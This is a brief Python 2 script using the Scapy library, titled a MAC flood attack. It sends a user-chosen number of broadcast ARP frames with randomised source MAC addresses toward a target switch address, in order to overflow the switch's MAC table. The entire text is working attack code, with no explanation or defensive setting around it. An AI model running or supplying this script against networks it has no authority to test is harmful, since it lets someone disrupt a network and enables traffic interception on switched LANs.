##############################################################
#                MAC Flood Attack Based on Scapy             #
##############################################################
from scapy.all import *
num = int(raw_input("Enter the number of packets: "))
interface = raw_input("Enter the Interface: ")

#Define the Target Switch IP
arp_pkt=ARP(pdst='172.16.10.1',hwdst="ff:ff:ff:ff:ff:ff")
eth_pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")

try:
    sendp(eth_pkt/arp_pkt,iface=interface,count =num, inter= .001)
except: 
    print "Destination Unreachable "
